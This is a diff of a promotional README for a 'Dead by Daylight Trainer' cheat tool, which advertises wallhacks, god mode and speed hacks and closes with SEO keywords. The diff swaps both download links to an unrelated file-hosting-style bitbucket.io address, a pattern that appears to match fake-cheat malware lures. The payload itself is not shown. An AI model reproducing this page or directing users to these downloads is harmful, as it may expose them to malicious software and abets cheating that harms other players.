@@ -6,7 +6,7 @@
 
 🎯 Whether you're the hunter or hunted — **you’re in charge** now.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/dead-by-daylight/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload17.bitbucket.io)
 ---
 
 ## 🔥 Trainer Features Breakdown
@@ -39,7 +39,7 @@
 * ✅ **Silent Movement** – Walk or run with zero audio
 * ✅ **Teleport to Player / Gen** – Cross the map instantly
 
-[![Download Trainer](https://repository-images.githubusercontent.com/709104713/8196eeb4-baef-4c77-94b0-205f91238966)](https://wecheaters.github.io/cheats/dead-by-daylight/)
+[![Download Trainer](https://repository-images.githubusercontent.com/709104713/8196eeb4-baef-4c77-94b0-205f91238966)](https://fileoffload17.bitbucket.io)
 ---
 
 ## 🎮 Trainer vs Cheats vs Legit Play
@@ -124,3 +124,4 @@ The **Dead by Daylight Trainer** is your shortcut to becoming a **godlike surviv
 Dead by Daylight trainer, god mode DBD, ESP wallhack, auto skill check mod, speed boost survivor, one hit killer hack, fly mode Dead by Daylight, instant gen trainer, DBD cheat trainer tool
 
 ---
+
